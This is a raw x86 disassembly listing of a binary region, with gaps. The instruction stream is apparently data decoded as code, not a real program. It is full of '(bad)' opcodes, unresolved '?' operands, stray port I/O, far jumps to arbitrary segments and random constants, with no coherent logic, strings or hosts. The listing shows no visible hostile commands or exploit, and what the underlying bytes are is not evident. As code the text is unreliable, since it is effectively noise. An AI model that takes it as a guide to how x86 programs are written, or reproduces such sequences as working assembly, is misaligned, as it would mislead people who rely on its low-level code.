  4289ad:	xlat   BYTE PTR ds:[ebx]
  4289ae:	cli    
  4289af:	aam    0x35
  4289b1:	jno    0x428959
  4289b3:	test   esp,edx
	...
  428a15:	add    BYTE PTR [ebp+0xc],cl
  428a18:	clc    
  428a19:	pop    ebx
  428a1a:	stc    
  428a1b:	(bad)  
  428a1c:	out    dx,eax
  428a1d:	push   ds
  428a1e:	push   ss
  428a1f:	xchg   edx,eax
  428a20:	data16 aas 
  428a22:	adc    DWORD PTR [edi],edx
  428a24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428a25:	sub    eax,0x1b1f8
  428a2a:	pop    es
  428a2b:	add    DWORD PTR [eax],eax
  428a2d:	add    BYTE PTR [ecx],dl
  428a2f:	sub    al,BYTE PTR [eax]
  428a31:	adc    BYTE PTR [ebx],bh
  428a33:	cli    
  428a34:	out    0xe6,al
  428a36:	dec    esp
  428a37:	push   esi
  428a38:	mov    ds:0x3e7f4815,eax
  428a3d:	popf   
  428a3e:	xchg   esp,eax
  428a3f:	test   eax,0xb2a7a7a1
  428a44:	out    dx,al
  428a45:	lock xchg ch,cl
  428a48:	outs   dx,DWORD PTR ds:[esi]
  428a49:	imul   ecx,DWORD PTR [edx],0xe1ac13d8
  428a4f:	xor    DWORD PTR [ecx+0x78081c2c],esp
  428a55:	js     0x428a40
  428a57:	jle    0x4289eb
  428a59:	xchg   ebx,eax
  428a5a:	retf   
  428a5b:	adc    dl,ch
  428a5d:	dec    eax
  428a5e:	mov    ecx,0xc7d9dea8
  428a63:	shl    DWORD PTR [ebp+esi*4+0x6b541094],1
  428a6a:	std    
  428a6b:	and    BYTE PTR [eax],bh
  428a6d:	repnz cmc 
  428a6f:	mov    WORD PTR [ebx+edx*4-0x28855a4f],?
  428a76:	mov    esp,0xad436e29
  428a7b:	test   eax,0xa6b80770
  428a80:	adc    eax,0x9b0be2d1
  428a85:	(bad)  
  428a86:	shl    DWORD PTR [ecx+0x69],0x28
  428a8a:	pop    ss
  428a8b:	rcr    edx,0x52
  428a8e:	mov    ebx,edi
  428a90:	sbb    al,0x91
  428a92:	(bad)  
  428a93:	xor    al,dh
  428a95:	mov    cl,0xad
  428a97:	pusha  
  428a98:	push   esp
  428a99:	loopne 0x428a55
  428a9b:	sub    ebx,DWORD PTR [ecx]
  428a9d:	fcomp  st(5)
  428a9f:	mov    eax,DWORD PTR [edx-0x44]
  428aa2:	mov    ecx,0xf680c3af
  428aa7:	mov    gs,WORD PTR [ebp-0x38f09d4d]
  428aad:	xor    eax,DWORD PTR [edi]
  428aaf:	call   0x11f0ac8f
  428ab4:	sub    eax,0xc4282154
  428ab9:	push   edi
  428aba:	mov    ch,0x4c
  428abc:	std    
  428abd:	inc    esi
  428abe:	loopne 0x428a64
  428ac0:	repz int3 
  428ac2:	and    DWORD PTR [ebp+0x73],0x3f
  428ac6:	sahf   
  428ac7:	sbb    al,0x2e
  428ac9:	xchg   bl,dh
  428acb:	rcl    DWORD PTR [ebx],0xb8
  428ace:	and    BYTE PTR [esi+edx*2-0x72bc939b],dl
  428ad5:	jae    0x428b05
  428ad7:	sub    DWORD PTR [ecx+eiz*4],esi
  428ada:	push   edi
  428adb:	mov    dl,0x2e
  428add:	rol    bl,1
  428adf:	jno    0x428a93
  428ae1:	icebp  
  428ae2:	inc    esp
  428ae3:	and    al,0x3e
  428ae5:	or     bh,BYTE PTR ds:0x9c54f210
  428aeb:	pop    ecx
  428aec:	test   DWORD PTR [esi],eax
  428aee:	jl     0x428b11
  428af0:	sub    ch,BYTE PTR [edx+0x5d]
  428af3:	or     ebx,ebp
  428af5:	in     al,dx
  428af6:	xlat   BYTE PTR ds:[ebx]
  428af7:	adc    al,0x5e
  428af9:	dec    esp
  428afa:	daa    
  428afb:	stos   DWORD PTR es:[edi],eax
  428afc:	mov    bh,0x89
  428afe:	jg     0x428afa
  428b00:	xlat   BYTE PTR ss:[ebx]
  428b02:	adc    DWORD PTR [ecx],esi
  428b04:	xor    edx,DWORD PTR ds:0xf0d2cbe7
  428b0a:	pop    ebp
  428b0b:	popf   
  428b0c:	sub    ch,BYTE PTR [esi+0x60fe069f]
  428b12:	lds    ebp,FWORD PTR [edx]
  428b14:	lods   al,BYTE PTR ds:[esi]
  428b15:	das    
  428b16:	test   al,0xc3
  428b18:	mov    ecx,DWORD PTR [esi]
  428b1a:	dec    eax
  428b1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428b1c:	arpl   bp,cx
  428b1e:	mov    bh,0xd0
  428b20:	dec    dh
  428b22:	ins    BYTE PTR es:[edi],dx
  428b23:	jmp    0x1b23:0x7ec9ae07
  428b2a:	sbb    DWORD PTR [edi],0x7e
  428b2d:	mov    edi,0x19d45f88
  428b32:	add    DWORD PTR [eax+0x62],edx
	...
  428b94:	add    BYTE PTR [eax],al
  428b96:	lds    edx,FWORD PTR [ebp-0x76]
  428b99:	cli    
  428b9a:	call   0x5fb1:0xb77ff5ff
  428ba1:	test   eax,0x3911ff03
  428ba6:	push   DWORD PTR [edx+0x1070001]
  428bac:	add    BYTE PTR [eax],al
  428bae:	cmp    BYTE PTR [ebx],dh
  428bb0:	sub    bl,BYTE PTR [ecx-0x17537c60]
  428bb6:	jns    0x428c2e
  428bb8:	cdq    
  428bb9:	popf   
  428bba:	and    BYTE PTR [esi-0x46],ah
  428bbd:	outs   dx,BYTE PTR ds:[esi]
  428bbe:	mov    dl,0x4a
  428bc0:	(bad)  
  428bc1:	cmp    BYTE PTR [ecx],cl
  428bc3:	(bad)  
  428bc4:	jecxz  0x428bbe
  428bc6:	loop   0x428bb4
  428bc8:	jb     0x428b8d
  428bca:	cli    
  428bcb:	mov    ah,0xc
  428bcd:	adc    al,0xf
  428bcf:	imul   ecx,DWORD PTR [ecx+edi*8-0x6ca32ea1],0xb6b351d
  428bda:	in     eax,dx
  428bdb:	push   cs
  428bdc:	sub    al,0xc9
  428bde:	test   eax,0x3704e8ee
  428be3:	call   DWORD PTR [ebx-0x6e4739dc]
  428be9:	std    
  428bea:	mov    ?,WORD PTR [esi-0x7d]
  428bed:	dec    ecx
  428bee:	mov    edi,0x20a7c6af
  428bf3:	(bad)  
  428bf4:	adc    bl,BYTE PTR [esi+eax*4-0x25]
  428bf8:	cmp    BYTE PTR [eax],ah
  428bfa:	(bad)  
  428bfb:	fld    TBYTE PTR [edi+esi*1-0x6f213d86]
  428c02:	sub    eax,0x34eb8f82
  428c07:	add    ah,0xe6
  428c0a:	stos   BYTE PTR es:[edi],al
  428c0b:	jle    0x428c3b
  428c0d:	and    BYTE PTR [esi],bh
  428c0f:	add    al,0x6f
  428c11:	imul   edi,DWORD PTR [edi+0x5a],0x7e
  428c15:	inc    ecx
  428c16:	jge    0x428c1b
  428c18:	fild   WORD PTR [edi]
  428c1a:	push   cs
  428c1b:	sar    eax,1
  428c1d:	loop   0x428c97
  428c1f:	stc    
  428c20:	push   esp
  428c21:	das    
  428c22:	jmp    0xf735835e
  428c27:	add    BYTE PTR [ebx+esi*8],ah
  428c2a:	inc    ebx
  428c2b:	fwait
  428c2c:	mov    esp,0x2bcea7ee
  428c31:	xchg   ebx,eax
  428c32:	popf   
  428c33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428c34:	fbld   TBYTE PTR [ebx-0x8]
  428c37:	call   0xd114fa34
  428c3c:	jne    0x428c58
  428c3e:	cmp    BYTE PTR [eax+0x7734b3b3],dh
  428c44:	dec    ecx
  428c45:	inc    ebx
  428c46:	xchg   BYTE PTR [edx+0x110061e],ch
  428c4c:	fsubr  st(3),st
  428c4e:	je     0x428bfd
  428c50:	mov    ebp,fs
  428c52:	pop    esi
  428c53:	shl    BYTE PTR [eax+ecx*2-0x40],0x8
  428c58:	fisub  WORD PTR [edx+0x63dd8b32]
  428c5e:	fdivr  QWORD PTR [ebx+0x6ba59d4b]
  428c64:	push   edi
  428c65:	xchg   esp,eax
  428c66:	mov    bl,0xb
  428c68:	lds    esp,FWORD PTR [ebp-0x3b481469]
  428c6e:	add    dl,BYTE PTR [edi+0x45bd475a]
  428c74:	sbb    BYTE PTR [edx],0xa9
  428c77:	(bad)
  428c7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428c7c:	outs   dx,DWORD PTR ds:[esi]
  428c7d:	nop
  428c7e:	push   eax
  428c7f:	std    
  428c80:	xchg   ebp,eax
  428c81:	mov    ebx,0x59c44dc9
  428c86:	ins    BYTE PTR es:[edi],dx
  428c87:	retf   
  428c88:	inc    ebx
  428c89:	pop    ss
  428c8a:	scas   eax,DWORD PTR es:[edi]
  428c8b:	int3   
  428c8c:	fwait
  428c8d:	rcl    BYTE PTR [ebx+0x79],0xe
  428c91:	in     al,0x3d
  428c93:	mov    cl,0xad
  428c95:	aaa    
  428c96:	mov    bh,0x38
  428c98:	repz pop eax
  428c9a:	jns    0x428c55
  428c9c:	push   cs
  428c9d:	push   ebx
  428c9e:	sub    DWORD PTR [ecx+edi*1],edi
  428ca1:	cmp    DWORD PTR [eax+0x30cdfa16],edi
  428ca7:	jecxz  0x428c2f
  428ca9:	inc    ebx
  428caa:	stos   DWORD PTR es:[edi],eax
  428cab:	sub    DWORD PTR gs:[edi-0x3de64d2b],ebx
  428cb2:	inc    ebp
  428cb3:	and    ah,BYTE PTR [edi+0x0]
	...
  428d15:	add    BYTE PTR [ecx-0xace0e4b],al
  428d1b:	jne    0x428cde
  428d1d:	mov    ch,0x86
  428d1f:	xchg   esi,eax
  428d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d21:	jns    0x428d4f
  428d23:	neg    bl
  428d25:	out    dx,eax
  428d26:	push   es
  428d27:	mov    ah,0x1
  428d29:	add    BYTE PTR [edi],al
  428d2b:	add    DWORD PTR [eax],eax
  428d2d:	add    dh,bl
  428d2f:	rol    DWORD PTR [esi-0x23],1
  428d32:	hlt    
  428d33:	ror    DWORD PTR [esp+eiz*2],cl
  428d36:	xor    eax,DWORD PTR [edi]
  428d38:	sar    BYTE PTR [eax+0x69],cl
  428d3b:	sub    DWORD PTR [eax],ebx
  428d3d:	in     al,dx
  428d3e:	push   esi
  428d3f:	jg     0x428cf1
  428d41:	or     esp,DWORD PTR [ecx-0x56cd3490]
  428d47:	aas    
  428d48:	xchg   ecx,eax
  428d49:	sbb    eax,0x1fc1182e
  428d4e:	pop    eax
  428d4f:	xchg   edx,eax
  428d50:	ins    DWORD PTR es:[edi],dx
  428d51:	push   ds
  428d52:	bound  esi,QWORD PTR ds:0x40711afd
  428d58:	loope  0x428d28
  428d5a:	in     al,dx
  428d5b:	in     al,0xa7
  428d5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428d5e:	push   cs
  428d5f:	rcl    BYTE PTR [edx+0x40a75f5f],0x23
  428d66:	scas   al,BYTE PTR es:[edi]
  428d67:	and    DWORD PTR [ebp+0x7c10b7c8],edi
  428d6d:	or     DWORD PTR [edi],edi
  428d6f:	fstp   st(0)
  428d71:	cmp    al,0xad
  428d73:	sub    al,0x23
  428d75:	or     DWORD PTR [edi+0x6],esi
  428d78:	(bad)  
  428d79:	in     eax,0x67
  428d7b:	jae    0x428dcd
  428d7d:	clc    
  428d7e:	pop    esi
  428d7f:	lahf   
  428d80:	jne    0x428d44
  428d82:	(bad)  
  428d83:	(bad)  
  428d84:	pshufw mm5,QWORD PTR [ebx],0x94
  428d88:	loopne 0x428dc5
  428d8a:	daa    
  428d8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428d8c:	or     eax,0xb0e12a5b
  428d91:	loop   0x428e0a
  428d93:	xor    al,0xc3
  428d95:	pop    eax
  428d96:	daa    
  428d97:	sub    eax,0xdbe7537e
  428d9c:	pop    es
  428d9d:	icebp  
  428d9e:	cmp    eax,0xb803cecd
  428da3:	aam    0xa1
  428da5:	jge    0x428d4b
  428da7:	es leave 
  428da9:	and    ch,bh
  428dab:	mov    ds:0xa982f13,eax
  428db0:	ret    0xe968
  428db3:	icebp  
  428db4:	cmp    bl,BYTE PTR [ebp+0x7c5b099f]
  428dba:	loop   0x428d74
  428dbc:	sti    
  428dbd:	dec    ebx
  428dbf:	cs pusha 
  428dc1:	cli    
  428dc2:	lds    eax,FWORD PTR [ebx-0x2f88373d]
  428dc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428dc9:	push   esp
  428dca:	and    ecx,DWORD PTR [edi-0x4561063c]
  428dd0:	aam    0xd2
  428dd2:	pop    ecx
  428dd3:	orps   xmm4,XMMWORD PTR [edx+0x2f]
  428dd7:	or     ch,BYTE PTR [edi-0x1c]
  428dda:	into   
  428ddb:	sahf   
  428ddc:	test   al,ah
  428dde:	in     al,dx
  428ddf:	out    dx,eax
  428de0:	mov    DWORD PTR [ebp+esi*4-0x2b171ef3],ecx
  428de7:	mov    BYTE PTR [edx-0x79],cl
  428dea:	rcl    DWORD PTR [ecx-0x26513e0e],1
  428df0:	rol    BYTE PTR [edi-0x5b],0x75
  428df4:	sbb    eax,0x49a4ff3a
  428df9:	fsub   DWORD PTR [ebx+ebx*2+0x3e]
  428dfd:	add    ebx,DWORD PTR [edi]
  428dff:	ss jle 0x428d83
  428e02:	loopne 0x428e21
  428e04:	sub    DWORD PTR [edi],ebp
  428e06:	pop    es
  428e07:	push   ebx
  428e08:	xor    DWORD PTR [edx+edi*2+0x6b],ebp
  428e0c:	(bad)  
  428e0d:	fwait
  428e0e:	cmp    al,BYTE PTR [ecx+0x62]
  428e11:	push   edx
  428e12:	enter  0x16d1,0xcb
  428e16:	imul   eax,DWORD PTR [edi-0x5],0xffffffda
  428e1a:	test   BYTE PTR [ecx+edi*2],0xb8
  428e1e:	mov    ebp,0x9b81c6d2
  428e23:	push   esp
  428e24:	xor    bl,ah
  428e26:	ret    0xef5c
  428e29:	loope  0x428e97
  428e2b:	cwde   
  428e2c:	push   edi
  428e2d:	sub    al,0xae
  428e2f:	inc    esi
  428e30:	fimul  DWORD PTR [ecx-0x69]
  428e33:	push   edx
  428e34:	or     al,0x0
	...
  428e96:	dec    edi
  428e97:	pop    ebp
  428e98:	pop    ecx
  428e99:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428e9d:	(bad)  
  428e9f:	cli    
  428ea0:	test   al,0xd9
  428ea2:	sub    al,0xcf
  428ea4:	hlt    
  428ea5:	dec    ecx
  428ea6:	or     eax,0x70001b5
  428eab:	add    DWORD PTR [eax],eax
  428ead:	add    BYTE PTR [eax-0x20170170],dl
  428eb3:	jne    0x428f0f
  428eb5:	jbe    0x428e41
  428eb7:	mov    eax,ds:0xa3e280e
  428ebc:	lea    esi,[edi+ecx*2]
  428ebf:	xor    al,0xe7
  428ec1:	xor    al,0x22
  428ec3:	ret    
  428ec4:	push   ss
  428ec5:	xchg   esp,eax
  428ec6:	popa   
  428ec7:	adc    ebx,0x5f0daacb
  428ecd:	sti    
  428ece:	adc    BYTE PTR [esi],bh
  428ed0:	fs pop edi
  428ed2:	sub    esp,esp
  428ed4:	pop    esi
  428ed5:	jae    0x428e91
  428ed7:	stos   BYTE PTR es:[edi],al
  428ed8:	push   edx
  428ed9:	sub    bh,BYTE PTR [eax]
  428edb:	jmp    0x46f8:0xf4ecc4b3
  428ee2:	ret    
  428ee3:	xlat   BYTE PTR ds:[ebx]
  428ee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428ee5:	call   0x61e5ba95
  428eea:	add    esp,eax
  428eec:	in     al,dx
  428eed:	mov    ds:0x1a364f65,eax
  428ef2:	or     DWORD PTR [ecx-0x2f],0x15d1552a
  428ef9:	push   esi
  428efa:	jmp    0x14f0:0x8025a418
  428f01:	push   0x566e3647
  428f06:	mov    dh,0xdf
  428f08:	xor    al,0xdf
  428f0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428f0b:	jmp    0x428edc
  428f0d:	mov    ah,bh
  428f0f:	jne    0x428ead
  428f11:	jae    0x428f32
  428f13:	dec    edx
  428f14:	popf   
  428f15:	scas   al,BYTE PTR es:[edi]
  428f16:	adc    ecx,DWORD PTR ds:0x4df28a4a
  428f1c:	or     ebp,DWORD PTR [ebp+0x1f]
  428f1f:	fs js  0x428f51
  428f22:	lods   al,BYTE PTR ds:[esi]
  428f23:	(bad)  
  428f24:	sbb    DWORD PTR [edi+esi*1],edx
  428f27:	xor    eax,0xa236929b
  428f2c:	enter  0x7c62,0xe9
  428f30:	cmp    al,0x15
  428f32:	add    esp,ecx
  428f34:	mov    dl,0x1d
  428f36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f37:	push   ds
  428f38:	and    eax,0xd135ae9c
  428f3d:	retf   0xf92b
  428f40:	ret    
  428f41:	mul    edi
  428f43:	sub    DWORD PTR [ebx+0x247a2e42],ebp
  428f49:	add    eax,0xffffffe2
  428f4c:	push   es
  428f4d:	scas   eax,DWORD PTR es:[edi]
  428f4e:	xor    ch,dl
  428f50:	pop    ds
  428f51:	mov    ds:0x1e144257,eax
  428f56:	in     al,dx
  428f57:	xchg   BYTE PTR [eax],al
  428f59:	inc    BYTE PTR es:[eax+0x29e29530]
  428f60:	pop    ebx
  428f61:	sub    al,0x39
  428f63:	mov    al,ds:0x75422429
  428f68:	cmc    
  428f69:	pop    ecx
  428f6a:	test   DWORD PTR ds:[eax+0x1a],esi
  428f6e:	mov    eax,0xa292224c
  428f73:	int3   
  428f74:	push   ebx
  428f75:	jae    0x428f67
  428f77:	xchg   esp,eax
  428f78:	into   
  428f79:	aad    0xcb
  428f7b:	pusha  
  428f7c:	mov    ah,0xb4
  428f7e:	nop
  428f7f:	aas    
  428f80:	push   edi
  428f81:	out    dx,al
  428f82:	fstp   DWORD PTR [ebx+ebx*8+0x2a769881]
  428f89:	shl    DWORD PTR [ebx],1
  428f8b:	sub    ebx,DWORD PTR [ecx-0x27]
  428f8e:	ins    DWORD PTR es:[edi],dx
  428f8f:	lea    ebp,[esi+0x1c22e969]
  428f95:	or     DWORD PTR [eax],eax
  428f97:	ror    BYTE PTR [edi-0x6bd6f605],1
  428f9d:	sbb    BYTE PTR [eax+0x1f],al
  428fa0:	stos   BYTE PTR es:[edi],al
  428fa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428fa2:	mov    dh,0x76
  428fa4:	pop    eax
  428fa5:	cmp    al,0x40
  428fa7:	(bad)  
  428fa8:	loop   0x428f9d
  428faa:	xor    al,0x15
  428fac:	clc    
  428fad:	in     eax,dx
  428fae:	sbb    al,0xcb
  428fb0:	mov    ?,edx
  428fb2:	(bad)  
  428fb3:	loop   0x428fe9
	...
  429015:	add    cl,ah
  429017:	in     al,dx
  429018:	mov    ebx,es
  42901a:	(bad)  
  42901b:	jecxz  0x42900c
  42901d:	out    dx,al
  42901e:	arpl   WORD PTR [esi+0x79],cx
  429021:	sbb    DWORD PTR [ebx-0x28],edx
  429024:	jecxz  0x428fb3
  429026:	adc    al,0xb6
  429028:	add    DWORD PTR [eax],eax
  42902a:	pop    es
  42902b:	add    DWORD PTR [eax],eax
  42902d:	add    BYTE PTR [ecx-0x6a],ch
  429030:	pushf  
  429031:	sub    DWORD PTR [eax-0x40],edx
  429034:	fwait
  429035:	xor    bh,BYTE PTR [eax+0x51c310be]
  42903b:	jg     0x4290af
  42903d:	jmp    0xe9d801cb
  429042:	test   BYTE PTR [esp+edx*1+0x1a],bl
  429046:	das    
  429047:	or     ebp,DWORD PTR [esi]
  429049:	xchg   edx,eax
  42904a:	(bad)  
  42904b:	lds    ecx,FWORD PTR [ecx+0x303558b1]
  429051:	and    al,0xa5
  429053:	lock in eax,dx
  429055:	(bad)  
  429056:	jmp    0x638165ec
  42905b:	stos   DWORD PTR es:[edi],eax
  42905c:	arpl   WORD PTR [ebx],dx
  42905e:	icebp  
  42905f:	xor    eax,0x6fa08be5
  429064:	xor    eax,0xb2e4b7bd
  429069:	xor    edi,ecx
  42906b:	pushf  
  42906c:	pop    es
  42906d:	mov    ebx,0x3485a942
  429072:	and    DWORD PTR [edi+0x52b0205],ebx
  429078:	mov    bh,0xa3
  42907a:	out    dx,eax
  42907b:	mov    edi,0xccb90526
  429080:	sub    al,0xef
  429082:	mov    ecx,0xb7247b72
  429087:	adc    DWORD PTR [esi+0x66e4f1e1],ecx
  42908d:	out    0x26,al
  42908f:	ja     0x429026
  429091:	sti    
  429092:	ret    
  429093:	or     dl,ch
  429095:	outs   dx,DWORD PTR ds:[esi]
  429096:	adc    dl,BYTE PTR [ecx]
  429098:	in     eax,dx
  429099:	addr16 mov dl,0x70
  42909c:	jnp    0x4290aa
  42909e:	leave  
  42909f:	inc    edx
  4290a0:	in     al,dx
  4290a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4290a2:	sti    
  4290a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4290a4:	pop    ebp
  4290a5:	in     eax,dx
  4290a6:	and    ah,BYTE PTR [eax+0x72b17d6d]
  4290ac:	adc    eax,0x677d09a0
  4290b1:	and    al,0x7d
  4290b3:	lods   eax,DWORD PTR ds:[esi]
  4290b4:	into   
  4290b5:	int    0xb3
  4290b7:	mov    ah,0x6b
  4290b9:	adc    BYTE PTR [ecx],ch
  4290bb:	sbb    DWORD PTR [edx],eax
  4290bd:	out    dx,eax
  4290be:	sbb    DWORD PTR [esi+0x759741a9],edx
  4290c4:	add    DWORD PTR [eax],0xe1b4c8f1
  4290ca:	dec    eax
  4290cb:	(bad)  
  4290cc:	mov    ebp,0x8c19a215
  4290d1:	dec    eax
  4290d2:	cwde   
  4290d3:	mov    edx,0xbb7b36
  4290d8:	dec    esi
  4290d9:	enter  0xa75e,0x62
  4290dd:	or     al,0xa3
  4290df:	or     eax,0x11fb9210
  4290e4:	and    al,0x62
  4290e6:	push   ebp
  4290e7:	xor    eax,0xa31675cc
  4290ec:	sub    eax,0xefbde019
  4290f1:	mov    esp,0x60a7651c
  4290f6:	icebp  
  4290f7:	add    bh,0x32
  4290fa:	loopne 0x4290e8
  4290fc:	cld    
  4290fd:	xchg   edi,eax
  4290fe:	xor    DWORD PTR [ebp-0x74],ecx
  429101:	pushf  
  429102:	les    eax,FWORD PTR [ebp+0x6868a330]
  429108:	mov    bl,0x3f
  42910a:	je     0x42912b
  42910c:	daa    
  42910d:	add    edi,DWORD PTR [eax+0x69be636]
  429113:	mov    ebx,0xd1c3391c
  429118:	jle    0x429117
  42911a:	rol    bh,0xc6
  42911d:	in     eax,dx
  42911e:	aam    0x4b
  429120:	jae    0x429116
  429122:	pop    esp
  429123:	jnp    0x429189
  429125:	push   edx
  429126:	and    al,0x2d
  429128:	add    al,0x17
  42912a:	ins    BYTE PTR es:[edi],dx
  42912b:	jmp    0x4290b4
  42912d:	aad    0xa6
  42912f:	shl    BYTE PTR [edx],1
  429131:	enter  0x3946,0x89
	...
  429195:	add    BYTE PTR [esi-0x79],dl
  429198:	std    
  429199:	test   ch,bh
  42919b:	(bad)  
  42919c:	jg     0x429175
  42919e:	xor    dh,0xd6
  4291a1:	stos   DWORD PTR es:[edi],eax
  4291a2:	in     al,dx
  4291a3:	cld    
  4291a4:	xchg   edx,eax
  4291a5:	cwde   
  4291a6:	sbb    esi,DWORD PTR [edi+0x1070001]
  4291ac:	add    BYTE PTR [eax],al
  4291ae:	jmp    0x85426f75
  4291b3:	call   eax
  4291b5:	(bad)  
  4291b6:	xchg   ebp,eax
  4291b7:	les    ebp,FWORD PTR [ecx+0x4]
  4291ba:	mov    ch,0xd5
  4291bc:	sbb    BYTE PTR [eax],dh
  4291be:	dec    ecx
  4291bf:	inc    edx
  4291c0:	jp     0x429188
  4291c2:	inc    esp
  4291c3:	fwait
  4291c4:	mov    ds:0x7982e2a1,al
  4291c9:	repnz sub eax,ecx
  4291cc:	xor    bl,ch
  4291ce:	std    
  4291cf:	mov    DWORD PTR [eax],ecx
  4291d1:	fnsave [eax]
  4291d3:	inc    ecx
  4291d4:	cmp    al,0xbd
  4291d6:	adc    DWORD PTR [esi],esi
  4291d8:	ret    0x14
  4291db:	in     eax,dx
  4291dc:	test   al,0xe7
  4291de:	(bad)  ds:0x5d1223e3
  4291e4:	mov    WORD PTR [edi-0x27268831],?
  4291ea:	in     eax,0x93
  4291ec:	cmp    eax,0xba099527
  4291f1:	daa    
  4291f2:	lea    edi,[ecx-0x6c7cdba2]
  4291f8:	mov    esp,0x8a901a0f
  4291fd:	fstp   TBYTE PTR [edx]
  4291ff:	arpl   WORD PTR ds:0x5e7975a3,dx
  429205:	cs pop es
  429207:	outs   dx,DWORD PTR ds:[esi]
  429208:	inc    ebx
  429209:	out    dx,al
  42920a:	push   cs
  42920b:	mov    DWORD PTR [esi-0xe],edi
  42920e:	int    0xcd
  429210:	lahf   
  429211:	fucomp st(6)
  429213:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429214:	mov    ebp,ss
  429216:	mov    WORD PTR [ebx],cs
  429218:	cmp    ch,bh
  42921a:	cs frndint 
  42921d:	xchg   ecx,eax
  42921e:	push   edx
  42921f:	push   edi
  429220:	or     al,0x46
  429222:	mov    eax,0x3363073c
  429227:	xchg   ebp,eax
  429228:	mov    edi,0x38c6dd12
  42922d:	out    0x83,eax
  42922f:	in     eax,0xca
  429231:	and    eax,0xc2a259e9
  429236:	fiadd  WORD PTR [edi]
  429238:	xchg   ebp,eax
  429239:	(bad)  [edx-0x78]
  42923c:	mov    ebx,0xbc7bbc63
  429241:	push   edi
  429242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429243:	call   0x5cd4:0xe5746ef2
  42924a:	mov    al,0x5d
  42924c:	repnz or ebp,ebx
  42924f:	popa   
  429250:	popa   
  429251:	mov    ah,0xc4
  429253:	mov    dh,BYTE PTR [esi+0x62]
  429256:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429257:	es or  eax,0x85c38a20
  42925d:	pop    edi
  42925e:	call   0x70ad3a45
  429263:	inc    esp
  429264:	xor    al,0xf3
  429266:	xor    al,bh
  429268:	lahf   
  429269:	sbb    eax,0xd0434e29
  42926e:	fldenv [ebp-0x48]
  429271:	imul   edx,DWORD PTR ds:0x1121e9e7,0x39acf2ed
  42927b:	sahf   
  42927c:	out    dx,al
  42927d:	jns    0x4292d5
  42927f:	rcl    DWORD PTR [ebx-0x61e7c8b9],cl
  429285:	inc    ebp
  429286:	outs   dx,BYTE PTR ds:[esi]
  429287:	loopne 0x429300
  429289:	dec    ebx
  42928a:	sete   BYTE PTR [ecx+0x10]
  42928e:	lds    ecx,FWORD PTR ds:0x2ca9bcb6
  429294:	mov    ah,0xf8
  429296:	jns    0x4292fa
  429298:	mov    bl,0xbb
  42929a:	test   BYTE PTR [ebp-0x2a],al
  42929d:	or     DWORD PTR [ebx+0x293f2f64],ebp
  4292a3:	pop    dx
  4292a5:	inc    esp
  4292a6:	adc    eax,0x75f9fdc3
  4292ab:	mov    bl,0x57
  4292ad:	dec    ebp
  4292ae:	das    
  4292af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4292b0:	xchg   edi,esp
  4292b2:	int    0xf3
  4292b4:	jl     0x4292b6
	...
  429316:	lock adc al,0xe1
  429319:	(bad)  
  42931a:	in     eax,0xff
  42931c:	call   FWORD PTR [esi]
  42931e:	xor    cl,BYTE PTR [ebx-0xc]
  429321:	shl    BYTE PTR fs:[ebx-0x47ddee71],0x1
  429329:	add    BYTE PTR [edi],al
  42932b:	add    DWORD PTR [eax],eax
  42932d:	add    BYTE PTR [edx+0x75575eab],al
  429333:	ds jno 0x42935a
  429336:	ins    DWORD PTR es:[edi],dx
  429337:	lahf   
  429338:	mov    eax,0x77c52619
  42933d:	add    BYTE PTR [ebx],dh
  42933f:	daa    
  429340:	retf   0xb375
  429343:	mov    ds:0xc469d0c9,al
  429348:	mul    BYTE PTR [edi]
  42934a:	ins    DWORD PTR es:[edi],dx
  42934b:	popa   
  42934c:	lock jae 0x429328
  42934f:	xchg   DWORD PTR [edi+edx*1-0x478c7f9],ecx
  429356:	cmp    dh,bl
  429358:	(bad)  
  429359:	call   0x748b6adb
  42935e:	retf   0x5467
  429361:	pushf  
  429362:	push   ecx
  429363:	push   ss
  429364:	dec    esi
  429365:	adc    eax,0x24718a9f
  42936a:	ja     0x429369
  42936c:	push   eax
  42936d:	pop    esp
  42936e:	jg     0x4293c3
  429370:	call   0x7584:0x9609becc
  429377:	cs cmc 
  429379:	cmp    BYTE PTR [esi+ebp*8],al
  42937c:	xor    DWORD PTR ds:0x34d7634d,eax
  429382:	and    ch,dl
  429384:	jnp    0x429380
  429386:	loope  0x4293ec
  429388:	out    dx,al
  429389:	addr16 retf 
  42938b:	retf   
  42938c:	pop    ds
  42938d:	add    DWORD PTR [edi-0x588458ed],edx
  429393:	mov    ecx,0x4a959017
  429398:	xchg   edx,eax
  429399:	or     al,0x34
  42939b:	sbb    ecx,esi
  42939d:	pop    ecx
  42939e:	into   
  42939f:	leave  
  4293a0:	or     al,0xc1
  4293a2:	inc    eax
  4293a3:	daa    
  4293a4:	cmp    al,0x89
  4293a6:	dec    eax
  4293a7:	push   ecx
  4293a8:	pop    ebx
  4293a9:	cmp    ebp,DWORD PTR [edx+eiz*1-0x6d]
  4293ad:	ins    DWORD PTR es:[edi],dx
  4293ae:	stos   BYTE PTR es:[edi],al
  4293af:	add    DWORD PTR [ebx+0x29cc2b11],edi
  4293b5:	jae    0x42938c
  4293b7:	xor    ah,bh
  4293b9:	jge    0x429424
  4293bb:	std    
  4293bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4293bd:	out    0x1c,eax
  4293bf:	push   ds
  4293c0:	pop    esp
  4293c1:	pop    edx
  4293c2:	add    eax,0xbfc1c786
